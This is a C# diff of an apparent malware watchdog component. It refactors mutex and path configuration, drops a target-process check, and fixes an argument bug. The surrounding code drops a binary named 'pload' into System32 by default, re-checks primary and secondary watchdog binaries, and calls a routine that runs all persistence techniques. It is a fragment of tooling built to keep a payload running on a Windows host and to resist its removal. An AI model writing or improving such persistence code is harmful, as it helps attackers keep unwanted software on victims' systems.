@@ -26,23 +26,22 @@ class Watchdog
 
 
     // Defaults to putting the file in the System32 directory and the binary name pload
-     public static string?BinaryPath { get; private set; }
-    public static string?BinaryName { get; private set; }
-    public static string? SecondaryWatchdogPath { get; private set; }
-    public static string? SecondaryWatchdogName { get; private set; }
-    public static string? SecondaryWatchdogMutexName { get; private set; }
+      public static string? BinaryPath { get; private set; } = null;
+    public static string? BinaryName { get; private set; } = null;
+    public static string? PrimaryWatchdogMutexName { get; private set; } = null;
+    public static string? SecondaryWatchdogPath { get; private set; } = null;
+    public static string? SecondaryWatchdogName { get; private set; } = null;
+    public static string? SecondaryWatchdogMutexName { get; private set; } = null;
+    public static string? PrimaryWatchdogPath { get; private set; } = null;
 
 
     static void Main(string[] args)
     {
-        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName"};
+        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName", "PrimaryWatchdogMutexName", "PrimaryWatchdogPath" };
         watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);
-        
-
-        string mutexName = "Watchdog";
 
         // Create or open the mutex to ensure only one instance is running
-        using (Mutex mutex = new Mutex(false, mutexName, out bool isNewInstance))
+        using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
         {
             if (!isNewInstance)
             {
@@ -50,18 +49,8 @@ class Watchdog
                 return;
             }
 
-            string targetProcessName = "OtherProcessName";  // Do not include '.exe'
-            if (watchdogHelper.watchdogHelper.IsProcessRunning(targetProcessName))
-            {
-                Console.WriteLine($"{targetProcessName} is already running. Proceeding with watchdog tasks.");
-                
-                // Place your watchdog logic here
+            
                 WatchdogLogic();
-            }
-            else
-            {
-                Console.WriteLine($"{targetProcessName} is not running. Exiting.");
-            }
         }
     }
 
@@ -73,7 +62,7 @@ class Watchdog
         {
 
             watchdogHelper.watchdogHelper.CheckBinary(SecondaryWatchdogPath, SecondaryWatchdogName);
-            watchdogHelper.watchdogHelper.CheckBinary(BinaryPath, BinaryPath);
+            watchdogHelper.watchdogHelper.CheckBinary(BinaryPath, BinaryName);
             Persistence.Persistence.runAllTechniques();
 
 
